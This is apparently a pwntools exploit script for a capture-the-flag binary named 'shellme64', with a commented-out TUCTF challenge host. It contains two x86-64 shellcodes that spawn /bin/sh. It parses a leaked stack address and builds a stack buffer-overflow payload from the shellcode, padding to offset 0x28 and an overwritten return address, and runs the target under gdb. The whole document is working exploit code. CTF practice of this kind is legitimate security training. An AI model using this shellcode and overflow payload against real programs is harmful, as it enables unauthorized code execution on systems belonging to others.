from pwn import *


shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

context.terminal = ['tmux', 'split-w', '-h']


# io = remote("chal.tuctf.com", 30507)
# io = process("./shellme64")
gdbscript = """
gef
b *0x555555555189
"""
io = gdb.debug(['./shellme64'], aslr=False, gdbscript=gdbscript)

io.recvline()
addr_stack = int(io.recvline(), 16)

payload = shellcode[:]
payload += b'A' * (0x28 - len(payload))
payload += p64(addr_stack)


# io.send(payload)

io.interactive()
